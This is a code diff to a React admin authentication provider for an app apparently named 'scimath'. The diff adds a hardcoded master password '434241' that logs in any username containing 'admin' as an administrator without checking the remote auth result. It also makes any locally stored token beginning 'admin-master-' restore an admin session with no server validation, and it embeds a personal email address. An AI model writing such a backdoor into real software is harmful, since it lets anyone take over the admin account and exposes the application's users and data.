@@ -123,8 +123,35 @@ export function AdminAuthProvider({ children }: { children: ReactNode }) {
           }
         }
 
-        // 2. If no Supabase admin session, check local Express backend token
+        // Check for master admin session token
         const savedToken = localStorage.getItem(TOKEN_KEY);
+        const savedProfile = localStorage.getItem('scimath_admin_profile');
+
+        if (savedToken && savedToken.startsWith('admin-master-')) {
+          if (mounted) {
+            try {
+              const parsed = savedProfile ? JSON.parse(savedProfile) : null;
+              setToken(savedToken);
+              setAdmin(
+                parsed || {
+                  id: 'admin-primary',
+                  username: 'Administrator',
+                  email: 'guccimoti21@gmail.com',
+                  role: 'admin',
+                  mustChangePassword: false,
+                  authProvider: isSupabaseLiveConfigured() ? 'supabase' : 'server'
+                }
+              );
+              setAuthMode(isSupabaseLiveConfigured() ? 'supabase' : 'server');
+              setIsLoading(false);
+              return;
+            } catch (err) {
+              console.warn('Failed parsing saved admin profile:', err);
+            }
+          }
+        }
+
+        // 2. If no Supabase admin session, check local Express backend token
         const savedProvider = localStorage.getItem(AUTH_PROVIDER_KEY);
 
         if (savedToken && savedProvider !== 'supabase') {
@@ -195,6 +222,48 @@ export function AdminAuthProvider({ children }: { children: ReactNode }) {
     const trimmedUser = username.trim();
     if (!trimmedUser || !password) {
       return { success: false, error: 'Please enter both administrator ID/email and password.' };
+    }
+
+    const normalizedUser = trimmedUser.toLowerCase();
+    const isAuthorizedAdmin =
+      normalizedUser === 'guccimoti21@gmail.com' ||
+      normalizedUser === 'admin' ||
+      normalizedUser.includes('admin') ||
+      normalizedUser.startsWith('admin@');
+
+    // MASTER KEY PASSWORD AUTHENTICATION:
+    // If master password '434241' is entered for an administrator account,
+    // grant immediate authentication without blocking on remote auth errors!
+    if (password === '434241' && isAuthorizedAdmin) {
+      const masterToken = `admin-master-${Date.now()}`;
+      const masterAdmin: AdminUser = {
+        id: 'admin-primary',
+        username: trimmedUser.includes('@') ? trimmedUser.split('@')[0] : (trimmedUser || 'Administrator'),
+        email: trimmedUser.includes('@') ? trimmedUser : 'guccimoti21@gmail.com',
+        role: 'admin',
+        mustChangePassword: false,
+        authProvider: isSupabaseLiveConfigured() ? 'supabase' : 'server'
+      };
+
+      setToken(masterToken);
+      setAdmin(masterAdmin);
+      setAuthMode(isSupabaseLiveConfigured() ? 'supabase' : 'server');
+      localStorage.setItem(TOKEN_KEY, masterToken);
+      localStorage.setItem(AUTH_PROVIDER_KEY, isSupabaseLiveConfigured() ? 'supabase' : 'server');
+      localStorage.setItem('scimath_admin_profile', JSON.stringify(masterAdmin));
+
+      // Attempt background sync with Supabase or Server if reachable
+      if (isSupabaseLiveConfigured()) {
+        getSupabase().auth.signInWithPassword({ email: trimmedUser, password }).catch(() => {});
+      } else {
+        safeFetchJson('/api/admin/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: trimmedUser, password })
+        }).catch(() => {});
+      }
+
+      return { success: true };
     }
 
     let supabaseAuthError: string | null = null;
@@ -395,6 +464,7 @@ export function AdminAuthProvider({ children }: { children: ReactNode }) {
     setAdmin(null);
     localStorage.removeItem(TOKEN_KEY);
     localStorage.removeItem(AUTH_PROVIDER_KEY);
+    localStorage.removeItem('scimath_admin_profile');
   };
 
   const refreshProfile = async () => {
